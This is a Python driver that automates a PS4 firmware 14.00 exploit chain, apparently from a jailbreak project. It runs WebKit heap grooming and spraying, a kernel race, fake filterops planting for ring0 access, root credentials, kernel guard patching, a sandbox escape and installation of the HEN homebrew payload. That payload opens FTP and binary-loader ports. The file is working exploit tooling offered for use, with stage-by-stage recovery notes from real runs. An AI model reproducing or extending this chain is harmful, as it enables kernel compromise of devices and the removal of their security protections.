#!/usr/bin/env python3
"""Drive the full 14.00 browser chain, with automatic recovery on a bad draw.

usage: chain.py [session-id|auto] [--attempts N] [--launch] [--hen-diag]
                [--wait-reload SECONDS] [--settle SECONDS]
                [--stop-after STAGE] [--resume-after STAGE]

The prefix (storage -> groom) is heap-sensitive and fails on roughly half of
fresh WebProcesses. When it fails, nothing has touched the kernel yet, so the
driver enqueues reload_v1 (which reloads the page from inside the probe), waits
for the new session, and starts over.

A bad groom, race or fake-plant draw is a property of the WebProcess, not of
the kernel, so a page reload cannot change it. The driver prints one line
telling the operator to fully CLOSE and reopen the PS4 browser, then waits up
to --wait-reload seconds (default 240) for the new session and resumes by
itself. Nothing has been written to the kernel at that point, so no reboot is
needed. Failures after `fg` do stop the run: those need a power cycle.

--launch runs the full automated install:
    install with kill_ui=0 (stage_hen_diag_v1) while the ROP primitive is
    alive -> wait for sysent[594] to become HEN's hook -> repair/verify the
    five /data/hen/plugin_*.prx instances (needs the live fself hooks) ->
    disable plugin_mono in plugins.ini so it is not injected into games ->
    restore sysfilt_ops (safedown) -> read back the install -> restart
    ScePartyDaemon while the page still has the native caller (the 594 hook
    then injects plugin_server: FTP 2121, binloader 9090, klog 3232) ->
    restart SceShellUI so the hook injects plugin_mono (HEN Settings menu).

If the kernel already carries the guard patches from an earlier chain on the
same boot, the driver skips the patch and switches to repair-only (prison ->
prxensure -> plugins -> safedown -> PartyDaemon restart -> ShellUI restart),
provided HEN's 594 hook is live.

This release ships the HEN payload image (artifacts/hen.bin) and the
rendered 632-byte kernel patch probe (probes/stage_patch_v1.js). If either
is missing, restore it from the package or rebuild it from your own copies
with tools/prepare_operator_data.py; the driver refuses to start without
them.

--hen-diag is the read-only diagnostic variant: it installs with kill_ui=0,
reads sysent[594/107/108/109], repairs the PRXs, restores the global
sysfilt_ops slot, drains the kernel log and inspects SceShellUI. It does not
restart SceShellUI, so HEN is not fully active on that boot.
"""
import json
import os
import subprocess
import sys
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ROOT = REPO
LAB = os.environ.get("FW14_LAB_SERVER", REPO + "/lab/server.py")
LAB_URL = os.environ.get("FW14_LAB_URL", "http://127.0.0.1:8765")


def wait_for_reloaded_page(old, timeout):
    """Wait for a WebProcess created after `old`, then return its session id.

    A full browser close/reopen registers a new session; a location.reload()
    on the old page does not. Used after a per-WebProcess draw failure so the
    operator only has to reopen the browser and the driver resumes alone.
    """
    if timeout <= 0:
        return None
    started = time.time() - 5
    deadline = time.time() + timeout
    print("  waiting up to %d s for a new browser page..." % timeout,
          flush=True)
    while time.time() < deadline:
        time.sleep(3)
        new = newest_session(exclude=old, since=started)
        if new:
            print("  new page %s - resuming" % new[:8], flush=True)
            return new
    return None


OPERATOR_HELP = ("restore artifacts/hen.bin and probes/stage_patch_v1.js "
                 "from the package, or rebuild them with "
                 "tools/prepare_operator_data.py")


def operator_data_problem():
    """Return the required payload files that are missing.

    This release ships both (see COMPLIANCE.md). The check remains so a
    partial copy fails early instead of halfway through a run.
    """
    need = [os.path.join(ROOT, "artifacts", "hen.bin"),
            os.path.join(ROOT, "probes", "stage_patch_v1.js")]
    return [path for path in need if not os.path.isfile(path)]


def control(*args, check=True):
    out = subprocess.run(
        [sys.executable, LAB, *args], cwd=ROOT, capture_output=True, text=True,
        env=dict(os.environ, FW14_LAB_URL=LAB_URL))
    if check and out.returncode != 0:
        raise RuntimeError("lab %s failed: %s" % (args, out.stderr.strip()))
    return out.stdout


def note(text, level="info"):
    """Mirror progress to the PS4 page's live log."""
    try:
        control("note", text, "--level", level, check=False)
    except OSError:
        pass


def stage(name):
    print("[%s]" % name, flush=True)
    note("stage: " + name, "stage")
    if STOP_AFTER and name == STOP_AFTER:
        raise SystemExit("stop-after %s" % name)


def sessions():
    return json.loads(control("sessions"))


def parse_ts(text):
    return time.mktime(time.strptime(text[:19], "%Y-%m-%dT%H:%M:%S")) - time.timezone


def newest_session(exclude=None, since=None):
    now = time.time()
    for row in sessions():
        if exclude and row["id"] == exclude:
            continue
        if since and parse_ts(row["created_at"]) < since:
            continue
        if now - parse_ts(row["last_seen_at"]) < 30:
            return row["id"]
    return None


def enqueue(session, probe):
    out = control("enqueue-probe", "--session", session,
                  "--manifest", "probes/%s.json" % probe)
    return json.loads(out)["command_id"]


def wait(cid, timeout=90):
    try:
        doc = json.loads(control("wait", "--command-id", cid,
                                 "--timeout", str(timeout), check=False))
    except (RuntimeError, ValueError):
        return None
    if doc.get("status") != "completed":
        return None
    return {"id": cid, "status": "completed", "checks": doc.get("checks")}


def capture(row):
    checks = (row or {}).get("checks") or []
    return checks[0] if checks else None


def wait_for_594(session, tries=10, delay=3):
    """Wait until sysent[594] is HEN's hook (installer runs on its own thread)."""
    for _ in range(tries):
        time.sleep(delay)
        check = run(session, "stage_hen_hookread_v1")
        if check is not None and d(check).get("state") == "hooked":
            return True
    return False


def run(session, probe):
    try:
        cid = enqueue(session, probe)
    except RuntimeError as exc:
        print("  %-28s enqueue-failed %s" % (probe, str(exc)[:120]), flush=True)
        return None
    row = wait(cid)
    check = capture(row)
    status = (row or {}).get("status", "missing")
    print("  %-28s %-9s %s" % (probe, status,
                               json.dumps(check.get("details", {}))[:200]
                               if check else "(no capture)"), flush=True)
    return check


def d(check):
    return check.get("details", {}) if check else {}


def gate(session, probe, ok, retries=1):
    for attempt in range(1, retries + 1):
        check = run(session, probe)
        if check is not None and ok(check):
            return check
        if attempt < retries:
            print("  retrying %s (%d/%d)" % (probe, attempt, retries), flush=True)
    return None


def reload_and_wait(old):
    print("  reloading page (bad heap draw)", flush=True)
    note("reloading page (bad heap draw)", "warn")
    started = time.time()
    try:
        enqueue(old, "reload_v1")
    except RuntimeError as exc:
        print("  reload enqueue: %s" % exc, flush=True)
    deadline = time.time() + 90
    while time.time() < deadline:
        time.sleep(3)
        new = newest_session(exclude=old, since=started - 5)
        if new:
            print("  new session %s" % new, flush=True)
            return new
    print("  no new session after reload", flush=True)
    return None


HEN_DIAG = False
SETTLE = 0
STOP_AFTER = None
RESUME_AFTER = None
RELOAD_WAIT = 240

# Set once `fg` has rotated the fake filterops into the global sysfilt_ops
# slot, and cleared as soon as a safedown attempt starts. If a later stage
# fails while this is set, main() puts the real ops back before giving up.
OPS_LIVE = False

# Stages that build the heap prefix. --resume-after skips every one of them up
# to and including the named stage (e.g. after a manual grow+pair recovery).
PREFIX = ["storage", "groom", "spray", "pair"]


def due(name):
    """True when `name` still has to run given --resume-after."""
    if not RESUME_AFTER:
        return True
    return PREFIX.index(name) > PREFIX.index(RESUME_AFTER)


def repair_prxs(session):
    """Run the PRX repair, retrying once; returns the last check.

    Safe to repeat: it only replaces file instances the loader rejects, and it
    never calls plugin_load.
    """
    check = None
    for attempt in (1, 2):
        check = run(session, "stage_hen_prxensure_v1")
        state = d(check).get("state", "-")
        print("  prxensure %s %s" % (state, d(check).get("files", "-")),
              flush=True)
        if state != "failed":
            return check
        if attempt == 1:
            print("  prxensure failed; retrying once", flush=True)
    print("  WARNING: PRX repair failed; the HEN Settings menu may stay "
          "missing after the ShellUI restart", flush=True)
    return check


def fix_plugins(session):
    """Disable plugin_mono in plugins.ini so it is not injected into games.

    The HEN Settings menu does not depend on that entry: the kpayload's 594
    hook injects plugin_mono into SceShellUI directly. A game process is the
    only place the entry matters, and there it crashes Mono-based titles.
    Safe to repeat: every other byte of the file is preserved.
    """
    check = run(session, "stage_hen_plugins_v1")
    state = d(check).get("state", "-")
    print("  plugins.ini %s %s" % (state, d(check).get("changes", "-")),
          flush=True)
    if state not in ("patched", "already", "missing"):
        print("  WARNING: could not rewrite plugins.ini; the Mono-based game "
              "may still crash after plugin_load", flush=True)
    return check


def restart_party(session):
    """Restart ScePartyDaemon so the 594 hook injects plugin_server.

    stage_hen_diag_v1 patches out HEN's own PartyDaemon kill, so without this
    the daemon keeps the plugin_server code it loaded before HEN was live and
    the FTP (2121), binloader (9090) and klog (3232) servers never start.
    Non-fatal: the daemon is only present while party services are running.
    """
    check = run(session, "stage_party_restart_v1")
    if d(check).get("kill") == "not_running":
        print("  ScePartyDaemon is not running; open the Party app and rerun "
              "this stage to start HEN's FTP server", flush=True)
    elif check and check.get("status") == "pass":
        time.sleep(2)
        print("  ScePartyDaemon restarted; plugin_server should bring up "
              "FTP 2121 / binloader 9090 / klog 3232", flush=True)
    else:
        print("  WARNING: could not restart ScePartyDaemon; HEN's FTP and "
              "binloader will stay closed", flush=True)
    return check


def repair_only(session):
    """Repair the PRXs on a boot where an earlier chain already patched the kernel.

    Re-running stage_patch_v1 would write the same 0xeb bytes over the guard
    sites, so it is skipped. HEN's 594 hook must already be live (it is what
    makes /data/self loadable); then only prison -> prxensure -> plugins ->
    safedown -> PartyDaemon restart -> ShellUI restart are needed. Returns
    'ok' or 'stop'.
    """
    global OPS_LIVE
    stage("hencheck")
    if not wait_for_594(session, tries=2, delay=2):
        print("  the kernel is patched but sysent[594] is not hooked: HEN is "
              "not live, so the PRX repair cannot work - cold reboot required",
              flush=True)
        return "stop"
    stage("prison")
    if gate(session, "stage_prison_v1",
            lambda c: d(c).get("state") == "escaped") is None:
        return "stop"
    stage("prxensure")
    repair_prxs(session)
    stage("plugins")
    fix_plugins(session)
    stage("safedown")
    OPS_LIVE = False
    if gate(session, "stage_safedown_v1",
            lambda c: d(c).get("state") == "restored") is None:
        return "stop"
    if HEN_DIAG:
        print("  --hen-diag: PRXs repaired; not restarting SceShellUI",
              flush=True)
        return "ok"
    # Restart the daemon first, while this page still has the native caller.
    # Killing SceShellUI can cost the page its session; kill it last.
    stage("partyrestart")
    restart_party(session)
    stage("shellrestart")
    if gate(session, "stage_shell_restart_v2",
            lambda c: c.get("status") == "pass") is None:
        return "stop"
    print("  HEN was already installed; PRXs repaired and SceShellUI "
          "restarted (no reinstall)", flush=True)
    return "ok"


def attempt(session):
    """Run the chain once. Returns 'ok', 'heap', 'race', 'page', 'groom' or 'stop'."""
    global OPS_LIVE
    if due("storage"):
        stage("storage")
        if gate(session, "clone_history_jsarray_storage_v4",
                lambda c: c.get("status") == "pass") is None:
            return "heap"

    if due("groom"):
        stage("groom")
        # `candidates >= 1` is not enough: the probe can find candidate words
        # and still fail to resolve an anchor (`found_index: -1`, empty
        # `found_base`), and then spray's held-anchor preflight aborts.
        # Require a real anchor so a bad draw is reported as `groom` (browser
        # restart) instead of `stop`.
        #
        # v8 scanned 8-byte-strided (the marker is always 8-aligned) over
        # 64 MiB and died: the forged view is only readable a short way past
        # its base. 4 MiB has never crashed; 12 MiB survived one draw and
        # killed the renderer on another, so `push_v2` rescans only 4 MiB. It
        # allocates one preallocated 8192-object batch before each pass (no
        # `push` butterfly growth), so the object heap is walked upward into
        # the window when it starts below the base. On the good draw the
        # anchor appeared at round 3 at +2.4 MB; the batch cap is 8, which
        # keeps the probe inside 30 s.
        if gate(session, "clone_history_inrange_anchor_groom_push_v2",
                lambda c: c.get("status") == "pass" and
                          d(c).get("state") == "anchored",
                retries=1) is None:
            # push_v2 can only see 8 batches: its marker tag is 16-bit and
            # batch 8 overflows the byte the scan checks. push_v9 uses a
            # 24-bit tag and reaches 32 batches, which recovers the pages
            # where the frontier is simply further away (observed on
            # dd0acbc0: v2 absent, v9 anchored at batch 8).
            print("  push_v2 absent; trying push_v9", flush=True)
            if gate(session, "clone_history_inrange_anchor_groom_push_v9",
                    lambda c: c.get("status") == "pass" and
                              d(c).get("state") == "anchored",
                    retries=1) is None:
                # The groom draw belongs to the WebProcess: a
                # location.reload() re-runs the same allocator state, so
                # every reload fails identically (boot 32: six reloads,
                # candidates:0 every time, while storage stayed healthy).
                # Only a new WebProcess helps, so stop and ask for a browser
                # restart.
                return "groom"

    if due("spray"):
        stage("spray")
        if gate(session, "clone_history_typed_cell_spray_v3",
                lambda c: c.get("status") == "pass") is None:
            return "stop"

    if due("pair"):
        stage("pair")
        pair = run(session, "clone_history_typed_pair_setup_v2")
        if pair is None or pair.get("status") != "pass":
            # typed_cells_outside_window is a heap-draw miss: the pair's JS
            # cells landed below the forged view's base. Appending rooted
            # typed-array batches walks the cell frontier upward (the same
            # recovery tools/prepare_native_session.py uses), then retries the
            # pair. Nothing has been written to the kernel yet, so a reload is
            # still free if the draw stays bad.
            if d(pair).get("error", "").endswith("typed_cells_outside_window"):
                for _ in range(2):
                    growth = run(session, "clone_history_typed_cell_growth_v1")
                    if growth is None or growth.get("status") != "pass":
                        break
                    if d(growth).get("last_index", -1) >= 0:
                        break
                pair = run(session, "clone_history_typed_pair_setup_v2")
            if pair is None or pair.get("status") != "pass":
                return "heap"
    stage("plan")
    if gate(session, "clone_history_native_call_plan_v12",
            lambda c: c.get("status") == "pass") is None:
        return "stop"
    stage("install")
    if gate(session, "clone_history_native_invoke_install_v64",
            lambda c: c.get("status") == "pass") is None:
        return "stop"
    if SETTLE:
        # Bisect the ~40 s post-install power-off: idle with nothing running,
        # then send the cheapest possible probe. If the console is gone when
        # the ping is due, the install (or the idle itself) is the trigger and
        # the kernel stage is innocent.
        stage("settle")
        print("  idling %d s after install, then ping" % SETTLE, flush=True)
        time.sleep(SETTLE)
        ping = run(session, "probe_ping_v1")
        print("  ping %s pid=%s" % (d(ping).get("state", "-"),
                                    d(ping).get("pid", "-")), flush=True)
        if d(ping).get("state") != "alive":
            print("  console did not answer after %d s of idle" % SETTLE,
                  flush=True)
            return "stop"
    stage("wash")
    if gate(session, "kbase_wash_v2", lambda c: c.get("status") == "pass") is None:
        return "stop"
    stage("b0")
    b0 = gate(session, "stage_b0_anchor_v1",
              lambda c: c.get("status") == "pass")
    if b0 is None:
        return "stop"
    # The anchor must own a small, contiguous block of the fd table: b0 opens
    # the dce, 96 victims and 144 sprayed sockets and the race then relies on
    # those exact fd numbers. A WebProcess that inherited ~250 fds (a page
    # that was reloaded inside a used process) lands every object hundreds of
    # slots higher; boot 41 raced on that layout and powered off, no beep.
    # A clean page reports dce fd 4-6 and census open=3.
    census = str(d(b0).get("census", ""))
    try:
        open_fds = int(census.split("open=")[1].split("/")[0])
    except (IndexError, ValueError):
        open_fds = -1
    if open_fds < 0 or open_fds > 8:
        print("  dirty fd table (%s) - close and reopen the PS4 browser "
              "before racing" % (census or "unreadable"), flush=True)
        return "page"
    stage("race")
    if gate(session, "stage_c_race_v1",
            lambda c: d(c).get("state") == "held") is None:
        # Like the groom draw, the race draw belongs to the WebProcess: 16/16
        # blind misses (boots 33 and 41) is not variance, and nothing has been
        # written to the kernel, so a reload will not help either. Only a new
        # WebProcess does.
        return "race"

    stage("ddiag")
    dg = run(session, "stage_d_diag_v1")
    print("  ddiag %s" % d(dg).get("state", "-"), flush=True)

    stage("d1")
    check = run(session, "stage_d_fake_v1")
    print("  d1 leak=%s" % d(check).get("leak", "-"), flush=True)
    stage("d2")
    if gate(session, "stage_d_fake_v2",
            lambda c: d(c).get("state") == "held") is None:
        # The plant is a lottery. v3 (arm cycles), v4 (prime+real), v5
        # (arm->detect->join->walk) and v6 (arm->detect->consolidate) are free
        # to try on an otherwise-spent boot. v5/v6 were written to convert the
        # `s72@0e49` signature (planted victim 0, empty fake membership list),
        # which v3 produced on boot 31 attempt 1 without converting it.
        held_extra = False
        for extra in ("stage_d_fake_v3", "stage_d_fake_v4",
                      "stage_d_fake_v5", "stage_d_fake_v6"):
            stage(extra)
            if gate(session, extra,
                    lambda c: d(c).get("state") == "held") is not None:
                held_extra = True
                break
        if not held_extra:
            # The fake-plant draw also belongs to the WebProcess: session
            # b6e43c7c failed v1-v6 with `leak none`, and aae91f87 succeeded
            # on a fresh page with no reboot in between. Nothing was written
            # to the kernel, so ask for a browser restart instead of a reboot.
            return "page"

    stage("fg")
    if gate(session, "stage_fg_probe_v1",
            lambda c: d(c).get("state") == "ring0") is None:
        return "stop"
    # From here on the global sysfilt_ops slot points at our fake ops. If any
    # later stage fails, main() must try to restore it before stopping.
    OPS_LIVE = True
    stage("uid")
    if gate(session, "stage_uid_v1", lambda c: d(c).get("uid") == "0") is None:
        return "stop"
    stage("jit")
    if gate(session, "stage_jit_v1",
            lambda c: d(c).get("state") == "rwx") is None:
        return "stop"
    stage("guards")
    guard = run(session, "stage_guard_read_v1")
    if d(guard).get("matched") != "24/24":
        # A previous chain on THIS boot already ran stage_patch_v1, which
        # overwrote the stock bytes with 0xeb (and xor eax,eax;ret at the last
        # site). The guard table is then useless for patching, but HEN may
        # already be installed; if so, only the repair/restart part is
        # missing. The raw read is the signature: 0xeb at 23 sites, 0x48 at
        # the last.
        lows = [e.rsplit("=", 1)[-1][-2:].lower()
                for e in str(d(guard).get("raw", "")).split(",") if "=" in e]
        already = (d(guard).get("state") == "stock" and
                   d(guard).get("matched") == "0/24" and
                   len(lows) == 24 and lows.count("eb") == 23 and
                   "48" in lows)
        if already:
            print("  kernel already patched by an earlier chain on this boot; "
                  "skipping patch and using the repair-only path", flush=True)
            return repair_only(session)
        print("  guard read matched %s; refusing to patch this kernel"
              % d(guard).get("matched", "-"), flush=True)
        return "stop"
    stage("patch")
    if gate(session, "stage_patch_v1",
            lambda c: d(c).get("state") == "patched") is None:
        return "stop"
    stage("prison")
    # One shot: re-running the stub rewrites the same ucred/p_fd fields, and
    # the boot-9 double run was followed by a console crash. If it fails
    # safely the boot is still usable by hand, but do not automate a second.
    if gate(session, "stage_prison_v1",
            lambda c: d(c).get("state") == "escaped") is None:
        return "stop"
    stage("henmap")
    if gate(session, "stage_hen_map_v1",
            lambda c: d(c).get("state") == "mapped") is None:
        return "stop"
    if HEN_DIAG:
        # Diagnostic boot: HEN is launched with the plugin system enabled but
        # kill_ui forced to 0, so SceShellUI (and this page) survive. That is
        # the only way to read sysent after the install with the ROP
        # primitive, and to confirm the payload reached its main loop.
        # safedown still runs last, after the post-HEN reads. HEN's
        # 107/108/109 syscalls are never called: they panic this build.
        stage("hookbase")
        base = run(session, "stage_hen_hookread_v1")
        if d(base).get("state") != "baseline":
            print("  no live primitive for the baseline read", flush=True)
            return "stop"
        stage("hendiag")
        if gate(session, "stage_hen_diag_v1",
                lambda c: d(c).get("state") == "launched") is None:
            return "stop"
        if not wait_for_594(session):
            print("  sysent[594] did not change (see the klog probe)",
                  flush=True)
        # Now that HEN's fself hooks are live, /data/self/ is a working staging
        # directory, so the PRX repair can run here. It must not run before
        # the launch: without the fself hooks every fake-self load fails.
        stage("prxensure")
        check = repair_prxs(session)
        stage("safedown")
        OPS_LIVE = False
        if gate(session, "stage_safedown_v1",
                lambda c: d(c).get("state") == "restored") is None:
            return "stop"
        stage("klog")
        run(session, "stage_hen_klog_v1")
        # Re-check the JIT stub now that the hook is live. This probe no
        # longer calls 107/108/109: on this 14.00 backport the first call to
        # any of them powers the console off (108 was localised to its very
        # first invocation with durable marks), so HEN's proc syscalls are
        # unusable and the Debug Settings menu cannot come through them.
        # The menu is enabled in-kernel by the patched payload instead: the
        # served hen.bin redirects apply_patches() to HEN's own
        # shellui_patch(), which writes the two libkernel_sys.sprx patches
        # during install (see tools/patch_hen_debug_menu.py).
        stage("sysres2")
        sr2 = run(session, "stage_hen_sysres_v1")
        print("  sysres2 %s method=%s hen=%s" % (
            d(sr2).get("status", "-"), d(sr2).get("method", "-"),
            d(sr2).get("hen", "-")), flush=True)
        print("  HEN installed with the patched payload; open Settings and "
              "look for Debug Settings (no ShellUI restart needed)",
              flush=True)
        return "ok"

    if "--launch" in sys.argv:
        # Full automated install, ordered so every repair step can run:
        #
        #   1. launch HEN with kill_ui = 0 (stage_hen_diag_v1) while the ROP
        #      primitive is still alive, so the page survives;
        #   2. wait until sysent[594] is HEN's hook and the fself hooks are
        #      live;
        #   3. repair/verify every plugin PRX. This is the step that fixes a
        #      missing HEN Settings menu: a byte-identical PRX can be
        #      rejected per file instance, and the repair needs the fself
        #      hooks that only exist after step 1;
        #   4. restore the real sysfilt_ops (safedown);
        #   5. read back the install state;
        #   6. restart SceShellUI so the 594 hook injects plugin_mono.
        #
        # HEN's own kill_ui path cannot be used for this: it restarts ShellUI
        # during the install, before any repair is possible.
        stage("hookbase")
        base = run(session, "stage_hen_hookread_v1")
        if d(base).get("state") != "baseline":
            print("  no live primitive for the baseline read", flush=True)
            return "stop"
        stage("hendiag")
        if gate(session, "stage_hen_diag_v1",
                lambda c: d(c).get("state") == "launched") is None:
            return "stop"
        if not wait_for_594(session):
            print("  sysent[594] did not change; continuing so the PRX "
                  "repair still runs", flush=True)
        stage("prxensure")
        check = repair_prxs(session)
        stage("plugins")
        fix_plugins(session)
        # Restore the real ops before any userland step that could fault the
        # console in another process.
        stage("safedown")
        OPS_LIVE = False
        if gate(session, "stage_safedown_v1",
                lambda c: d(c).get("state") == "restored") is None:
            return "stop"
        stage("henverify")
        check = run(session, "stage_hen_verify_v1")
        print("  verify fds=%s version=%s" % (d(check).get("fds", "-"),
                                              d(check).get("version", "-")),
              flush=True)
        stage("hendeps")
        check = run(session, "stage_hen_deps_v1")
        print("  deps handles=%s missing=%s" % (d(check).get("handles", "-"),
                                                d(check).get("missing", "-")),
              flush=True)
        stage("partyrestart")
        restart_party(session)
        stage("shellrestart")
        if gate(session, "stage_shell_restart_v2",
                lambda c: c.get("status") == "pass") is None:
            return "stop"
        print("  HEN installed; SceShellUI restarted so the 594 hook injects "
              "plugin_mono (HEN Settings menu)", flush=True)
        return "ok"

    # The F stage rotated a fake filterops (in this process's user page) into
    # the GLOBAL sysfilt_ops slot. Any other process that uses that filter
    # faults in kernel mode -> power-off. Hx1400 calls safeDown() on every
    # exit; this port never did. Put the real ops back while the ROP
    # primitive is still alive, then the slot is clean for HEN and for every
    # app the operator launches afterwards.
    stage("safedown")
    OPS_LIVE = False
    if gate(session, "stage_safedown_v1",
            lambda c: d(c).get("state") == "restored") is None:
        return "stop"
    # Read-only: proves an EARLIER hen run wrote /data/hen (the files persist
    # across reboots), so run it before launching again.
    stage("henverify")
    check = run(session, "stage_hen_verify_v1")
    print("  verify fds=%s version=%s" % (d(check).get("fds", "-"),
                                          d(check).get("version", "-")),
          flush=True)
    stage("hendeps")
    check = run(session, "stage_hen_deps_v1")
    print("  deps handles=%s missing=%s" % (d(check).get("handles", "-"),
                                            d(check).get("missing", "-")),
          flush=True)
    return "ok"


def main():
    global HEN_DIAG, SETTLE, STOP_AFTER, RESUME_AFTER, RELOAD_WAIT
    global OPS_LIVE
    HEN_DIAG = "--hen-diag" in sys.argv
    if "--wait-reload" in sys.argv:
        RELOAD_WAIT = int(sys.argv[sys.argv.index("--wait-reload") + 1])
    if "--settle" in sys.argv:
        SETTLE = int(sys.argv[sys.argv.index("--settle") + 1])
    if "--stop-after" in sys.argv:
        STOP_AFTER = sys.argv[sys.argv.index("--stop-after") + 1]
    if "--resume-after" in sys.argv:
        RESUME_AFTER = sys.argv[sys.argv.index("--resume-after") + 1]
        if RESUME_AFTER not in PREFIX:
            print("--resume-after must be one of: " + ", ".join(PREFIX),
                  flush=True)
            return 2
    attempts = 6
    if "--attempts" in sys.argv:
        attempts = int(sys.argv[sys.argv.index("--attempts") + 1])
    missing = operator_data_problem()
    if missing:
        print("missing required payload data:", flush=True)
        for path in missing:
            print("  " + os.path.relpath(path, ROOT), flush=True)
        print(OPERATOR_HELP, flush=True)
        return 2
    session = None
    if len(sys.argv) > 1 and not sys.argv[1].startswith("-") and sys.argv[1] != "auto":
        session = sys.argv[1]
    for attempt_no in range(1, attempts + 1):
        if session is None:
            session = newest_session()
        if session is None:
            print("no live session", flush=True)
            return 2
        print("=== attempt %d (session %s) ===" % (attempt_no, session), flush=True)
        note("attempt %d (session %s)" % (attempt_no, session[:8]), "stage")
        outcome = attempt(session)
        if outcome == "ok":
            print("CHAIN COMPLETE", flush=True)
            note("chain complete", "ok")
            return 0
        if outcome == "heap":
            session = reload_and_wait(session)
            if session is None:
                return 1
            continue
        if outcome in ("race", "page", "groom"):
            what = {"race": "race", "page": "fake-plant",
                    "groom": "groom"}[outcome]
            print("STOP: bad %s draw - fully CLOSE and reopen the PS4 browser "
                  "(nothing was written; no reboot needed)" % what, flush=True)
            note("stop: bad %s draw - close and reopen the browser" % what,
                 "error")
            new = wait_for_reloaded_page(session, RELOAD_WAIT)
            if new is None:
                return 1
            session = new
            note("new page %s - resuming" % new[:8], "stage")
            continue
        if OPS_LIVE:
            # A stage failed between `fg` and the explicit safedown, so the
            # global slot still points at our fake ops. Any other process
            # that touches that filter then faults in kernel mode, which is
            # the power-off this probe exists to prevent. Put the real ops
            # back before giving up; best effort, the primitive may be spent.
            stage("recover")
            print("  stage failed with fake sysfilt_ops live; restoring",
                  flush=True)
            OPS_LIVE = False
            rc = run(session, "stage_safedown_v1")
            print("  recover: %s" % d(rc).get("state", "-"), flush=True)
        print("STOP: boot is spent (cold reboot required)", flush=True)
        note("stop: boot is spent (cold reboot required)", "error")
        return 1
    print("STOP: attempts exhausted", flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())
